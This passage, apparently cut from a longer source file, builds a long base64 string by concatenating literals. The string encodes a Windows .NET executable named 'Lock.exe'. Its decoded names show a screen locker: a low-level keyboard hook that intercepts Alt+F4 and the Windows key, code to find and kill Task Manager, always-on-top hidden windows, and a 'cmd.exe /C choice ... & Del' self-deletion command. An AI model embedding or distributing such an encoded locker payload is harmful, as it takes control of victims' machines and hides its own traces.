      + "0BvQABAuMMsADpAJEIxAAJAnULywAJArkP1wAJAnYR3AARAlUA4gAZAskM5wAZArcM7gDpA"
      + "NUO8gBxAYMD+ABxAZIDAQAhAn4QBgB5ASsL/AAxAoIJFQCBAUcPBgGBAUADDAE5AtoDEgGB"
      + "AQ8EJAGBAbsJBgBBAs0ILAFJAoQPMAFRAnIPNgFRAboBFQBZAuMMBgCxAboILAFZAlkPEAB"
      + "ZAqEDOwFZAtsQFQBZAs0DEACBAYsQQgHpAKoEBgCxAfIP7gBpAvIPSwHpABgFBgAhAnkPow"
      + "DpAJEQFQBxArAEBgDpALAEFQB5AuMMBgBRAeMMUAEhAp0QBgBRAXUJAQCBAuMMVwGJAg0PX"
      + "QGJAp0CZAGZArAHawHpAKkMcQGhAuMMeAHpABcIfgHpADoRFQDpAG8DhQHpAMEQFQAhAsQD"
      + "EADpAGoRjAHpAHoLFQDpAK4KkQHpALgQEADpAPIEmAEhAqsQFQBRAUIJvQBRATkJvQAhAtc"
      + "BowDhAFERsgHBAmQItwHJAuMMEADhAOMMBgDhALYBvgHRAk4CxAFhAQYLzwFhAc8CEgHJAu"
      + "MM1QHhAAcI3QHZArAEBgDBAMgOsgHBAIsC+ADBAHYIEgHhAuMMEAA8ALkH8wEKADAAEQIKA"
      + "DQAGgIFADgAIwIIADwAJQIIAEAAKgIIAHAALwIIAHQANAIIAHgAOQIIAHwAPgIIAIAAQwII"
      + "AIQASAIIAIgATQIIAIwAUgIIAJAAVwIIAJQAXAIIAJgAYQIIAJwAZgIIAKAAZgIgAHsANAI"
      + "gAIMANAIgAHMADgQpALsA/AUuAAsA5gMuABMA7wMuABsADgQuACMAFwQuACsAFwQuADMAFw"
      + "QuADsAFwQuAEMAFwQuAEsAFwQuAFMAFwQuAFsAHQQuAGMARwRAAIsANAJDAGsAjQRDAHMAV"
      + "ARJALsADQZgAIsANAJjAGsAjQRjAHMAVARpALsAIQaAAIMANAKAAHMAVASDAJMANAKDAJsA"
      + "NAKDAGsAjQSJALsALgajAJMANAKjAGsApgSjAMMANAKjALMANAKjAJsANAKpALsAPAbAAIM"
      + "ANALDALMANALDAGsA5wTDAHMADgTJAHMADgTgAIMANALjAJMANALjAJsANALjAMMANALjAL"
      + "MANALpAHMADgQAAYMANAIDAcsANAIgAYMANAIjAXMAVAQjAaMAQQUpAbsAUAZAAYMANAJDA"
      + "XMAVARDAaMAmgVjAXMAVARjAVMAFwQAAsMANAIAAnMADgSBArMANAKBAtMAXQShArMANAKh"
      + "AtMAaQTBArMANALBAtMAdQThArMANALhAtMAgQQBA6sANAIhA3MAVARBA7MANAJBA6sANAL"
      + "ABMMANALgBIsANAIABbMANAIgBbMANAJABbMANAJgBbMANAKABbMANAKgBbMANALABbMANA"
      + "LgBbMANAIABoMANAIgBoMANAJABoMANAJABnMAVARgBnMAVASABnMAVASgBnMAVATABnMAV"
      + "AQgB3MAVAQgB4MANAJAB3MAVARAB4MANAJgB3MAVARgB4MANAKAB3MAVASAB4MANAKgB4MA"
      + "NALAB4MANALgB4MANALgB3MAVAQACIMANAIgCIMANAIgCHMAVASnAM4AAgEWAZ8BqAHnAQQ"
      + "AAQAFAAYABgAIAAcACQAIAAoACQAPAAsAEAAAAKAMpgMAAGYKqwMAAIYMsAMAAAcPtQMAAE"
      + "INugMAAA8MvwMAAG4ExQMAACkQywMAAH0OywMAANkO0AMAAEcA1gMAAG4A1gMAAIQA1gMAA"
      + "KgA1gMAADIA3AMAAGEC4QMCAAYAAwACAAcABQACAAgABwACAAkACQACAAoACwACAAsADQAC"
      + "AAwADwABAA0ADwACABEAEQACABIAEwACABkAFQACACgAFwABACkAFwACACoAGQABACsAGQA"
      + "CACwAGwABAC0AGwACAC4AHQABAC8AHQACADcAHwABADgAHwACAEAAIQCwCU4AowlRAFgAXw"
      + "BmAG0ArwHsAfcBRgEvANAQAQBGATEA7hABAEYBOQAnEQEAQwE7AHIQAgBGAT0ABwMDAEYBQ"
      + "QAWEQEARgFDAAIRAQAEgAAAAQAAAAAAAAAAAAAAAABOCQAAAgAAAAAAAAAAAAAA/wFdAQAA"
      + "AAACAAAAAAAAAAAAAAD/AfEJAAAAAAgAAAAAAAAAAAAAAAgCZgEAAAAAAgAAAAAAAAAAAAA"
      + "A/wHmDgAAAAACAAAAAAAAAAAAAAAIAqsIAAAAAAAAAAABAAAAAQ4AALgAAAABAAAAFg4AAA"
      + "kABAAKAAQACwAEAAwACAANAAgAAAAQABYABwEAABAAYQAHAQAAAABjAAcBAAAQAHsABwEAA"
      + "AAAfQAHAQkBygFgAOIBYgDiAQkB+gECAHUAAwB1AAAAAAAAVGhyZWFkU2FmZU9iamVjdFBy"
      + "b3ZpZGVyYDEAbV9Gb3JtMQBnZXRfRm9ybTEAc2V0X0Zvcm0xAGdldF9UaW1lcjEAc2V0X1R"
      + "pbWVyMQB1c2VyMzIAUmVhZEludDMyAGdldF9UaW1lcjIAc2V0X1RpbWVyMgBnZXRfVGltZX"
      + "IzAHNldF9UaW1lcjMAa2V5UHJlc3NBbHRGNABnZXRfVGltZXI0AHNldF9UaW1lcjQAPE1vZ"
      + "HVsZT4AU2hvd05BAF9ob29rSUQAU2l6ZUYAV0hfS0VZQk9BUkRfTEwAVktfTFdJTgBTeXN0"
      + "ZW0uSU8AS0VZRVZFTlRGX0tFWVVQAFdNX0tFWVVQAFQAU1cAS0VZRVZFTlRGX0VYVEVOREV"
      + "ES0VZAERpc3Bvc2VfX0luc3RhbmNlX18AQ3JlYXRlX19JbnN0YW5jZV9fAHZhbHVlX18AUH"
      + "JvamVjdERhdGEAbXNjb3JsaWIATWljcm9zb2Z0LlZpc3VhbEJhc2ljAExvd0xldmVsS2V5Y"
      + "m9hcmRQcm9jAF9wcm9jAGR3VGhyZWFkSWQARm9ybTFfTG9hZABhZGRfTG9hZABBZGQAc2V0"
      + "X0VuYWJsZWQARm9ybTFfRm9ybUNsb3NlZABnZXRfSXNEaXNwb3NlZABtX0Zvcm1CZWluZ0N"
      + "yZWF0ZWQAU2hvd01pbmltaXplZABTaG93TWF4aW1pemVkAFN5bmNocm9uaXplZABod25kAG"
      + "hNb2QAVGFyZ2V0TWV0aG9kAHNldF9Jc1NpbmdsZUluc3RhbmNlAENyZWF0ZUluc3RhbmNlA"
      + "GdldF9HZXRJbnN0YW5jZQBkZWZhdWx0SW5zdGFuY2UAaW5zdGFuY2UASGlkZQBHZXRIYXNo"
      + "Q29kZQBuQ29kZQBzZXRfQXV0b1NjYWxlTW9kZQBBdXRoZW50aWNhdGlvbk1vZGUAU2h1dGR"
      + "vd25Nb2RlAGdldF9NZXNzYWdlAEVuZEludm9rZQBCZWdpbkludm9rZQBJRGlzcG9zYWJsZQ"
      + "BIYXNodGFibGUAR2V0TW9kdWxlSGFuZGxlAFJ1bnRpbWVUeXBlSGFuZGxlAEdldFR5cGVGc"
      + "m9tSGFuZGxlAEZpbGUAZ2V0X01haW5Nb2R1bGUAUHJvY2Vzc01vZHVsZQBzZXRfU2h1dGRv"
      + "d25TdHlsZQBzZXRfRm9ybUJvcmRlclN0eWxlAGdldF9DbGFzc1N0eWxlAHNldF9DbGFzc1N"
      + "0eWxlAHNldF9XaW5kb3dTdHlsZQBQcm9jZXNzV2luZG93U3R5bGUAc2V0X05hbWUAc2V0X0"
      + "ZpbGVOYW1lAGdldF9Nb2R1bGVOYW1lAGxwTW9kdWxlTmFtZQBscENsYXNzTmFtZQBscFdpb"
      + "mRvd05hbWUAR2V0UHJvY2Vzc2VzQnlOYW1lAENoZWNrRm9yU3luY0xvY2tPblZhbHVlVHlw"
      + "ZQBHZXRUeXBlAFJlc3RvcmUAZ2V0X0N1bHR1cmUAc2V0X0N1bHR1cmUAcmVzb3VyY2VDdWx"
      + "0dXJlAFdpbmRvd3NGb3Jtc0FwcGxpY2F0aW9uQmFzZQBBcHBsaWNhdGlvblNldHRpbmdzQm"
      + "FzZQBDbG9zZQBEaXNwb3NlAE11bHRpY2FzdERlbGVnYXRlAERlbGVnYXRlQXN5bmNTdGF0Z"
      + "QBFZGl0b3JCcm93c2FibGVTdGF0ZQBzZXRfV2luZG93U3RhdGUARm9ybVdpbmRvd1N0YXRl"
      + "AFNob3dOb0FjdGl2YXRlAFRocmVhZFN0YXRpY0F0dHJpYnV0ZQBTVEFUaHJlYWRBdHRyaWJ"
      + "1dGUAQ29tcGlsZXJHZW5lcmF0ZWRBdHRyaWJ1dGUARGVzaWduZXJHZW5lcmF0ZWRBdHRyaW"
      + "J1dGUAR3VpZEF0dHJpYnV0ZQBIZWxwS2V5d29yZEF0dHJpYnV0ZQBHZW5lcmF0ZWRDb2RlQ"
      + "XR0cmlidXRlAERlYnVnZ2VyTm9uVXNlckNvZGVBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJp"
      + "YnV0ZQBFZGl0b3JCcm93c2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3N"
      + "lbWJseVRpdGxlQXR0cmlidXRlAFN0YW5kYXJkTW9kdWxlQXR0cmlidXRlAEhpZGVNb2R1bG"
      + "VOYW1lQXR0cmlidXRlAERlYnVnZ2VyU3RlcFRocm91Z2hBdHRyaWJ1dGUAQXNzZW1ibHlUc"
      + "mFkZW1hcmtBdHRyaWJ1dGUARGVidWdnZXJIaWRkZW5BdHRyaWJ1dGUAQXNzZW1ibHlGaWxl"
      + "VmVyc2lvbkF0dHJpYnV0ZQBNeUdyb3VwQ29sbGVjdGlvbkF0dHJpYnV0ZQBBc3NlbWJseUR"
      + "lc2NyaXB0aW9uQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQX"
      + "NzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFzc"
      + "2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBB"
      + "Y2Nlc3NlZFRocm91Z2hQcm9wZXJ0eUF0dHJpYnV0ZQBnZXRfQmx1ZQBtX1RocmVhZFN0YXR"
      + "pY1ZhbHVlAFdpdGhFdmVudHNWYWx1ZQBHZXRPYmplY3RWYWx1ZQB2YWx1ZQBTYXZlAFNob3"
      + "dNaW5Ob0FjdGl2ZQBSZW1vdmUATG9jay5leGUAc2V0X0NsaWVudFNpemUARm9yY2VNaW5pb"
      + "Wl6ZQBTeXN0ZW0uVGhyZWFkaW5nAGdldF9Vc2VDb21wYXRpYmxlVGV4dFJlbmRlcmluZwBH"
      + "ZXRSZXNvdXJjZVN0cmluZwBUb1N0cmluZwBGb3JtMV9Gb3JtQ2xvc2luZwBhZGRfRm9ybUN"
      + "sb3NpbmcAZGlzcG9zaW5nAFN5c3RlbS5EcmF3aW5nAGdldF9FeGVjdXRhYmxlUGF0aABHZX"
      + "RUZW1wUGF0aABiVmsAQXN5bmNDYWxsYmFjawBEZWxlZ2F0ZUNhbGxiYWNrAEhvb2tDYWxsY"
      + "mFjawBUaW1lcjFfVGljawBUaW1lcjJfVGljawBUaW1lcjNfVGljawBUaW1lcjRfVGljawBh"
      + "ZGRfVGljawByZW1vdmVfVGljawBMb2NrAGhoawBpZEhvb2sAU2V0SG9vawBNYXJzaGFsAE5"
      + "vcm1hbABzZXRfSW50ZXJ2YWwAc2V0X0NhbmNlbABTeXN0ZW0uQ29tcG9uZW50TW9kZWwAa2"
      + "VybmVsMzIuZGxsAHVzZXIzMi5kbGwAS2lsbABDb250YWluZXJDb250cm9sAE9iamVjdEZsb"
      + "3dDb250cm9sAGxQYXJhbQB3UGFyYW0AU3lzdGVtAHNldF9NYWluRm9ybQBPbkNyZWF0ZU1h"
      + "aW5Gb3JtAEVudW0AcmVzb3VyY2VNYW4AYlNjYW4AbHBmbgBTeXN0ZW0uQ29tcG9uZW50TW9"
      + "kZWwuRGVzaWduAE1haW4AZ2V0X0FwcGxpY2F0aW9uAE15QXBwbGljYXRpb24AU3lzdGVtLk"
      + "NvbmZpZ3VyYXRpb24AU3lzdGVtLkdsb2JhbGl6YXRpb24AU3lzdGVtLlJlZmxlY3Rpb24Ac"
      + "2V0X1N0YXJ0UG9zaXRpb24ARm9ybVN0YXJ0UG9zaXRpb24AVGFyZ2V0SW52b2NhdGlvbkV4"
      + "Y2VwdGlvbgBJbnZhbGlkT3BlcmF0aW9uRXhjZXB0aW9uAGdldF9Jbm5lckV4Y2VwdGlvbgB"
      + "Bcmd1bWVudEV4Y2VwdGlvbgBnZXRfQ2xvc2VSZWFzb24AUnVuAGFkZF9TaHV0ZG93bgBkd0"
      + "V4dHJhSW5mbwBDdWx0dXJlSW5mbwBQcm9jZXNzU3RhcnRJbmZvAFplcm8Ac2V0X1Nob3dJb"
      + "lRhc2tiYXIAbV9BcHBPYmplY3RQcm92aWRlcgBtX1VzZXJPYmplY3RQcm92aWRlcgBtX0Nv"
      + "bXB1dGVyT2JqZWN0UHJvdmlkZXIAbV9NeVdlYlNlcnZpY2VzT2JqZWN0UHJvdmlkZXIAbV9"
      + "NeUZvcm1zT2JqZWN0UHJvdmlkZXIAc2VuZGVyAGdldF9SZXNvdXJjZU1hbmFnZXIAYWRkZW"
      + "RIYW5kbGVyAEZvcm1DbG9zaW5nRXZlbnRIYW5kbGVyAFNodXRkb3duRXZlbnRIYW5kbGVyA"
      + "FN5c3RlbS5Db2RlRG9tLkNvbXBpbGVyAFRpbWVyAElDb250YWluZXIAZ2V0X1VzZXIARW50"
      + "ZXIAZ2V0X0NvbXB1dGVyAE15Q29tcHV0ZXIAc2V0X0JhY2tDb2xvcgBDbGVhclByb2plY3R"
      + "FcnJvcgBTZXRQcm9qZWN0RXJyb3IAQWN0aXZhdG9yAC5jdG9yAC5jY3RvcgBNb25pdG9yAE"
      + "ludFB0cgBTeXN0ZW0uRGlhZ25vc3RpY3MATWljcm9zb2Z0LlZpc3VhbEJhc2ljLkRldmljZ"
      + "XMAZ2V0X1dlYlNlcnZpY2VzAE15V2ViU2VydmljZXMATWljcm9zb2Z0LlZpc3VhbEJhc2lj"
      + "LkFwcGxpY2F0aW9uU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAE1"
      + "pY3Jvc29mdC5WaXN1YWxCYXNpYy5Db21waWxlclNlcnZpY2VzAFN5c3RlbS5SdW50aW1lLk"
      + "NvbXBpbGVyU2VydmljZXMAU3lzdGVtLlJlc291cmNlcwBMb2NrLk15LlJlc291cmNlcwBMb"
      + "2NrLkZvcm0xLnJlc291cmNlcwBMb2NrLlJlc291cmNlcy5yZXNvdXJjZXMARGVidWdnaW5n"
      + "TW9kZXMAc2V0X0VuYWJsZVZpc3VhbFN0eWxlcwBkd0ZsYWdzAGdldF9TZXR0aW5ncwBBdXR"
      + "vU2F2ZVNldHRpbmdzAE15U2V0dGluZ3MARm9ybUNsb3NlZEV2ZW50QXJncwBGb3JtQ2xvc2"
      + "luZ0V2ZW50QXJncwBDYW5jZWxFdmVudEFyZ3MAUmVmZXJlbmNlRXF1YWxzAFV0aWxzAGdld"
      + "F9DcmVhdGVQYXJhbXMAU3lzdGVtLldpbmRvd3MuRm9ybXMAZ2V0X0Zvcm1zAE15Rm9ybXMA"
      + "c2V0X0F1dG9TY2FsZURpbWVuc2lvbnMAU3lzdGVtLkNvbGxlY3Rpb25zAFJ1bnRpbWVIZWx"
      + "wZXJzAEdldEN1cnJlbnRQcm9jZXNzAHNldF9Bcmd1bWVudHMAY29tcG9uZW50cwBFeGlzdH"
      + "MARm9jdXMAS2V5cwBDb25jYXQAYWRkZWRIYW5kbGVyTG9ja09iamVjdABUYXJnZXRPYmplY"
      + "3QATXlQcm9qZWN0AG9wX0V4cGxpY2l0AGdldF9TYXZlTXlTZXR0aW5nc09uRXhpdABzZXRf"
      + "U2F2ZU15U2V0dGluZ3NPbkV4aXQAZ2V0X0RlZmF1bHQAU2V0Q29tcGF0aWJsZVRleHRSZW5"
      + "kZXJpbmdEZWZhdWx0AFNob3dEZWZhdWx0AElBc3luY1Jlc3VsdABEZWxlZ2F0ZUFzeW5jUm"
      + "VzdWx0AEVudmlyb25tZW50AEluaXRpYWxpemVDb21wb25lbnQAa2V5YmRfZXZlbnQAQnJpb"
      + "mdUb0Zyb250AFN0YXJ0AHNldF9Ub3BNb3N0AFN1c3BlbmRMYXlvdXQAUmVzdW1lTGF5b3V0"
      + "AHNldF9UZXh0AHNldF9LZXlQcmV2aWV3AEZpbmRXaW5kb3cAc2V0X0NyZWF0ZU5vV2luZG9"
      + "3AFNob3dXaW5kb3cAbkNtZFNob3cAVW5ob29rV2luZG93c0hvb2tFeABTZXRXaW5kb3dzSG"
      + "9va0V4AENhbGxOZXh0SG9va0V4AE1heABzZXRfQ29udHJvbEJveABMb2NrLk15AENvbnRha"
      + "W5zS2V5AGdldF9Bc3NlbWJseQBzZXRfT3BhY2l0eQBvcF9FcXVhbGl0eQBNeVNldHRpbmdz"
      + "UHJvcGVydHkAAAAAAB1MAG8AYwBrAC4AUgBlAHMAbwB1AHIAYwBlAHMAAA90AGEAcwBrAG0"
      + "AZwByAAAVcwBlAGwAZQBjAHQALgBkAGEAdAAARS8AQwAgAGMAaABvAGkAYwBlACAALwBDAC"
      + "AAWQAgAC8ATgAgAC8ARAAgAFkAIAAvAFQAIAA1ACAAJgAgAEQAZQBsACAAAA9jAG0AZAAuA"
      + "GUAeABlAAALRgBvAHIAbQAxAAAJbABvAGMAawAAOVcAaQBuAEYAbwByAG0AcwBfAFIAZQBj"
      + "AHUAcgBzAGkAdgBlAEYAbwByAG0AQwByAGUAYQB0AGUAADVXAGkAbgBGAG8AcgBtAHMAXwB"
      + "TAGUAZQBJAG4AbgBlAHIARQB4AGMAZQBwAHQAaQBvAG4AAEdQAHIAbwBwAGUAcgB0AHkAIA"
      + "BjAGEAbgAgAG8AbgBsAHkAIABiAGUAIABzAGUAdAAgAHQAbwAgAE4AbwB0AGgAaQBuAGcAA"
      + "AAAAJc4Bum7nMhGofRVRw41COcABCABAQgDIAABBSABARERBCABAQ4EIAEBAgUgAgEODgUg"
      + "AQERPQcgBAEODg4OAwAAAgQAAQECBSABAR0OBiABARGA3QYgAQERgOEFIAEBEnUGFRIsARI"
      + "MBhUSLAESCAYVEiwBEmUGFRIsARIkBhUSLAESKAQgABMABQACAhwcBwABEn0RgOUFIAASgO"
      + "kHIAIBDhKA6QgAARKA7RKA7QQAARwcAyAAAgMHARwEAAEBHAUgAgEcGAYgAQESgP0GIAEBE"
      + "oDFBiABARKBAQIGGAgHAhGArRKAsQQAARgIBQACAhgYBAABCBgGAAEBEoCxAwAAAQUgABKA"
      + "uQMgAAgFIAARgRUDBwEOBQAAEoDBBSAAEoEdAyAADg0HBBKAwR0SgMEIEoCxBwABHRKAwQ4"
      + "DAAAOBQACDg4OBAABAg4GIAEBEYExCAABEoDBEoEtBAABAQgGIAEBEoChBSACAQwMBiABAR"
      + "GBQQYgAQERgUkFAAARgU0GIAEBEYFNBSACAQgIBiABARGBUQYgAQERgVUEIAEBDQYgAQERg"
      + "VkGIAEBEYFdCAcCEoDFEoCpBgcCHgASeQIeAAQgAQIcBgACDg4dDgUgAgEcHAUQAQAeAAQK"
      + "AR4ABSAAEoCxByACAQ4SgLEEIAEBHAQKARIgBAcBHgAGFRIsARMAAwYTAAITAAQKARMACLd"
      + "6XFYZNOCJCLA/X38R1Qo6CAEAAAAAAAAACAIAAAAAAAAAAVsEDQAAAAQBAQAABAAAAAAEAQ"
      + "AAAAQCAAAABAMAAAAEBAAAAAQFAAAABAYAAAAEBwAAAAQIAAAABAkAAAAECgAAAAQLAAAAB"
      + "wYVEiwBEgwHBhUSLAESCAcGFRIsARJlBwYVEiwBEiQHBhUSLAESKAQGEoCNBAYSgJEDBhIY"
      + "AgYCAgYcAgYKAgYFAgYIAwYSNAQGEoChBAYSgKkDBhJxAwYSIAMGETAFAAEBHQ4EAAASDAQ"
      + "AABIIBAAAEmUEAAASJAQAABIoBQAAEoCNBQAAEoCRBgABARKAkQcAAgEcEoCZBAAAEhgGAA"
      + "MYCBgYByACARwSgLUFAAIYDg4FAAICGAgHIAIBHBKAmQcgAgEcEoC9BwAEGBgIGBgHAAQBB"
      + "QUKCgUAARgQDgUAARgSNAgABBgIEjQYCQQAARgYBSAAEoCpBiABARKAqQcQAQEeAB4ABzAB"
      + "AQEQHgAEIAASfQQgABIgBSABARIgDCAFEoDRCBgYEoDVHAYgARgSgNEGIAMYCBgYBAgAEgw"
      + "ECAASCAQIABJlBAgAEiQECAASKAUIABKAjQUIABKAkQQIABIYBSgAEoC5BSgAEoCpBCgAEi"
      + "AEKAATAAgBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEIAQACAAAAA"
      + "AAFAQAAAAApAQAkMDViYjdkOWEtZDM3Yi00MjgzLTkyNmMtZmJkZjcwZTI3MzljAAAMAQAH"
      + "MS4wLjAuMAAACAEAAQAAAAAACwEABlRpbWVyMQAACwEABlRpbWVyMgAACwEABlRpbWVyMwA"
      + "ACwEABlRpbWVyNAAAGAEACk15VGVtcGxhdGUIMTEuMC4wLjAAAEABADNTeXN0ZW0uUmVzb3"
      + "VyY2VzLlRvb2xzLlN0cm9uZ2x5VHlwZWRSZXNvdXJjZUJ1aWxkZXIHNC4wLjAuMAAAWQEAS"
      + "01pY3Jvc29mdC5WaXN1YWxTdHVkaW8uRWRpdG9ycy5TZXR0aW5nc0Rlc2lnbmVyLlNldHRp"
      + "bmdzU2luZ2xlRmlsZUdlbmVyYXRvcggxMS4wLjAuMAAAWAEAGVN5c3RlbS5XaW5kb3dzLkZ"
      + "vcm1zLkZvcm0SQ3JlYXRlX19JbnN0YW5jZV9fE0Rpc3Bvc2VfX0luc3RhbmNlX18STXkuTX"
      + "lQcm9qZWN0LkZvcm1zAABhAQA0U3lzdGVtLldlYi5TZXJ2aWNlcy5Qcm90b2NvbHMuU29hc"
      + "Eh0dHBDbGllbnRQcm90b2NvbBJDcmVhdGVfX0luc3RhbmNlX18TRGlzcG9zZV9fSW5zdGFu"
      + "Y2VfXwAAABABAAtNeS5Db21wdXRlcgAAEwEADk15LkFwcGxpY2F0aW9uAAAMAQAHTXkuVXN"
      + "lcgAADQEACE15LkZvcm1zAAATAQAOTXkuV2ViU2VydmljZXMAABABAAtNeS5TZXR0aW5ncw"
      + "AAAAAAtAAAAM7K774BAAAAkQAAAGxTeXN0ZW0uUmVzb3VyY2VzLlJlc291cmNlUmVhZGVyL"
      + "CBtc2NvcmxpYiwgVmVyc2lvbj0yLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tl"
      + "eVRva2VuPWI3N2E1YzU2MTkzNGUwODkjU3lzdGVtLlJlc291cmNlcy5SdW50aW1lUmVzb3V"
      + "yY2VTZXQCAAAAAAAAAAAAAABQQURQQURQtAAAALQAAADOyu++AQAAAJEAAABsU3lzdGVtLl"
      + "Jlc291cmNlcy5SZXNvdXJjZVJlYWRlciwgbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAuMCwgQ"
      + "3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5I1N5c3Rl"
      + "bS5SZXNvdXJjZXMuUnVudGltZVJlc291cmNlU2V0AgAAAAAAAAAAAAAAUEFEUEFEULQAAAA"
      + "AAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAyFYAAAAAAAAAAAAA4lYAAAAgAAAAAAAAAA"
      + "AAAAAAAAAAAAAAAAAAANRWAAAAAAAAAAAAAAAAX0NvckV4ZU1haW4AbXNjb3JlZS5kbGwAA"
      + "AAAAP8lACBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAQAAAAIAAAgBgAAABQAACAAAAAAAAAAAAAAAAAAAA"
      + "BAAEAAAA4AACAAAAAAAAAAAAAAAAAAAABAAAAAACAAAAAAAAAAAAAAAAAAAAAAAABAAEAAA"
      + "BoAACAAAAAAAAAAAAAAAAAAAABAAAAAABcAwAAkGAAAMwCAAAAAAAAAAAAAMwCNAAAAFYAU"
      + "wBfAFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAQAAAAAAAAABAAAA"
      + "AAA/AAAAAAAAAAQAAAABAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4"
      + "AZgBvAAAAAAAkAAQAAABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsAQsAgAAAQBTAH"
      + "QAcgBpAG4AZwBGAGkAbABlAEkAbgBmAG8AAAAIAgAAAQAwADAAMAAwADAANABiADAAAAAaA"
      + "AEAAQBDAG8AbQBtAGUAbgB0AHMAAAAAAAAAIgABAAEAQwBvAG0AcABhAG4AeQBOAGEAbQBl"
      + "AAAAAAAAAAAAKgABAAEARgBpAGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAAAAAAAA"
      + "wAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAuADAAAAAyAAkAAQ"
      + "BJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAEwAbwBjAGsALgBlAHgAZQAAAAAAJgABAAEAT"
      + "ABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAAAAAACoAAQABAEwAZQBnAGEAbABUAHIA"
      + "YQBkAGUAbQBhAHIAawBzAAAAAAAAAAAAOgAJAAEATwByAGkAZwBpAG4AYQBsAEYAaQBsAGU"
      + "AbgBhAG0AZQAAAEwAbwBjAGsALgBlAHgAZQAAAAAAIgABAAEAUAByAG8AZAB1AGMAdABOAG"
      + "EAbQBlAAAAAAAAAAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMQAuA"
      + "DAALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAx"
      + "AC4AMAAuADAALgAwAAAAbGMAAOoBAAAAAAAAAAAAAO+7vzw/eG1sIHZlcnNpb249IjEuMCI"
      + "gZW5jb2Rpbmc9IlVURi04IiBzdGFuZGFsb25lPSJ5ZXMiPz4NCg0KPGFzc2VtYmx5IHhtbG"
      + "5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MSIgbWFuaWZlc3RWZXJzaW9uP"
      + "SIxLjAiPg0KICA8YXNzZW1ibHlJZGVudGl0eSB2ZXJzaW9uPSIxLjAuMC4wIiBuYW1lPSJN"
      + "eUFwcGxpY2F0aW9uLmFwcCIvPg0KICA8dHJ1c3RJbmZvIHhtbG5zPSJ1cm46c2NoZW1hcy1"
      + "taWNyb3NvZnQtY29tOmFzbS52MiI+DQogICAgPHNlY3VyaXR5Pg0KICAgICAgPHJlcXVlc3"
      + "RlZFByaXZpbGVnZXMgeG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYzI"
      + "j4NCiAgICAgICAgPHJlcXVlc3RlZEV4ZWN1dGlvbkxldmVsIGxldmVsPSJhc0ludm9rZXIi"
      + "IHVpQWNjZXNzPSJmYWxzZSIvPg0KICAgICAgPC9yZXF1ZXN0ZWRQcml2aWxlZ2VzPg0KICA"
      + "gIDwvc2VjdXJpdHk+DQogIDwvdHJ1c3RJbmZvPg0KPC9hc3NlbWJseT4AAAAAAAAAAAAAAA"
      + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB"
      + "QAAAMAAAA9DYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
